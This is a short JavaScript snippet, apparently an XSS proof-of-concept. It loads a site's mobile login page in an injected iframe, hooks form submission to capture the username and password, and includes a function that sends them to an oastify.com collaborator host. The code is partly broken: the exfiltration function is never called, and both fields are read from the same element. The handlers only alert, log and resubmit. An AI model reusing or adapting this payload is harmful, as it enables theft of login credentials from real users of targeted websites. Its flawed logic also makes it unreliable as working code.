// Function to dynamically create the iframe and append it to the body
    function createIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = "/account/login/mobile";
        iframe.id = "loginFrame";
        document.body.appendChild(iframe);
        return iframe;
    }

    var frame = createIframe();

    // Add load event listener to iframe to inject script after it loads
    frame.onload = function () {
        var doc = frame.contentDocument || frame.contentWindow.document;

        // Inject script to listen to form submission inside the iframe
        var script = doc.createElement('script');
        script.textContent = `
            function sendData(username, password) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
                xhr.send();
            }

            document.body.addEventListener('submit', function(event) {
                if (event.target.tagName.toLowerCase() === 'form') {
                    var username = event.target.querySelector('#control').value;
                    var password = event.target.querySelector('#control').value;
                    alert(username+password);
                    console.log(username+password);
                    
                    event.preventDefault();
                    setTimeout(() => { event.target.submit(); }, 1000);
                }
            });

            
            var formxyz = document.getElementsByTagName('form')[0]; // Adjust selector as needed
            formxyz.onsubmit = function(event) {
                var username = document.getElementById('control').value;
                var password = document.getElementById('control').value;
                alert(username+password);
                console.log(username+password);
                
                event.preventDefault();
                setTimeout(() => { formxyz.submit(); }, 1000);
            };
        `;
        doc.body.appendChild(script);
    };
